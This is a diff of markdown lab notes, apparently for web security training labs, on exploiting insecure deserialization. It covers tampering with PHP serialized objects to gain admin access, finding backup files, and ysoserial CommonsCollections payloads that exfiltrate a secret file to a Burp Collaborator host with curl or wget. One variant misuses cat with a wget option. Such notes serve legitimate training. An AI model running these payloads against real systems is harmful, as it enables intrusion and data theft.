@@ -23,18 +23,20 @@
 
 ```bash
 - b:0?  -> change to -> b:1 
-- access token? -> s:32<token> -> change to ->  b:1   e.g -> s:13:"administrator";s:12:"access_token";b:1
+- access token? -> s:32<token> -> change to ->  b:1   e.g -> s:13:"administrator";s:12:"access_token";b:1;
 - backup file -> <file>~  , e.g ->  /libs/CustomTemplate.php~
 
 
 cat /home/carlos/secret.txt | curl -X POST --data-binary @- http://<BURP-COLLAB>
 
-/usr/lib/jvm/java-8-temurin/bin/java -jar ysoserial-all.jar CommonsCollections<N>  '/usr/bin/wget --post-file /home/carlos/secret https://<BURP-COLLAB>' | base64 -w 0;echo
+/usr/lib/jvm/java-8-temurin/bin/java -jar ysoserial-all.jar CommonsCollections<N>  '/usr/bin/wget --post-file /home/carlos/secret http://<BURP-COLLAB>' | base64 -w 0;echo
 
-/usr/lib/jvm/java-8-temurin/bin/java -jar ysoserial-all.jar CommonsCollections<N>  '/usr/bin/cat --post-file /home/carlos/secret https://<BURP-COLLAB>'  | base64 -w 0;echo
-
-
+/usr/lib/jvm/java-8-temurin/bin/java -jar ysoserial-all.jar CommonsCollections<N>  '/usr/bin/cat --post-file /home/carlos/secret http://<BURP-COLLAB>'  | base64 -w 0;echo
+ 
 ```
+
+Instead of using ysoserial, I really recommend using [RcEcHaIn](https://github.com/B3XAL/rCeChAiN) from [B3XAL](https://github.com/B3XAL)  
+It really helped me with the problems I was having with ysoserial.
 
 
 
